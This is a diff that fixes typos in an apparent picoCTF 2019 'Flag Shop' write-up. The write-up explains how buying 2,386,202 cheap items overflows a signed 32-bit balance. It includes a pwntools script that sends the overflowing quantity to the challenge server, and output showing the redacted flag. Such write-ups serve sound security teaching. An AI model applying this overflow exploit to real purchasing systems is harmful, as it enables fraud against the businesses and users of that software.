@@ -112,7 +112,7 @@ Here we should note that the `account_balance` variable is a signed integer rath
 This means it stores both positive and negative numbers in [two's complement](https://en.wikipedia.org/wiki/Two%27s_complement) format.  
 
 We can exploit this fact by wrapping around the value by doing an expensive purchase.  
-The purchase needs to be larger than `2**31 - 1` for a 32-bit value.
+The value needs to be larger than `2**31 - 1` for a 32-bit integer.
 
 Each `Defintely not the flag` flag costs `900` and the `1337 Flag` costs 100000. Our start balance is 1100.  
 So if we buy `(2**31 - 1 - 1100 + 100000) // 900` flags we ought to wrap around.
@@ -134,13 +134,13 @@ context.log_level = "info"
 io = remote(SERVER, PORT)
 # Buy a lot of 'Defintely not the flag' Flags
 amount = (2**31 - 1 - 1100 + 100000) // 900
-log.info(f"Bying {amount} Defintely not the flag Flags")
+log.info(f"Buying {amount} Defintely not the flag Flags")
 io.sendlineafter(b" Enter a menu selection\n", b"2")
 io.sendlineafter(b"2. 1337 Flag\n", b"1")
 io.sendlineafter(b"These knockoff Flags cost 900 each, enter desired quantity\n", str(amount).encode('ascii'))
 
 # Buy the 1337 flag
-log.info(f"Bying 1 1337 Flag")
+log.info(f"Buying 1 1337 Flag")
 io.sendlineafter(b" Enter a menu selection\n", b"2")
 io.sendlineafter(b"2. 1337 Flag\n", b"2")
 io.sendlineafter(b"Enter 1 to buy one", b"1")
@@ -158,8 +158,8 @@ Then we run the script to get the flag
 ┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2019/General_Skills/Flag_shop]
 └─$ ~/python_venvs/pwntools/bin/python get_flag.py
 [+] Opening connection to jupiter.challenges.picoctf.org on port 4906: Done
-[*] Bying 2386202 Defintely not the flag Flags
-[*] Bying 1 1337 Flag
+[*] Buying 2386202 Defintely not the flag Flags
+[*] Buying 1 1337 Flag
 YOUR FLAG IS: picoCTF{<REDACTED>}
 [*] Closed connection to jupiter.challenges.picoctf.org port 4906
 ```
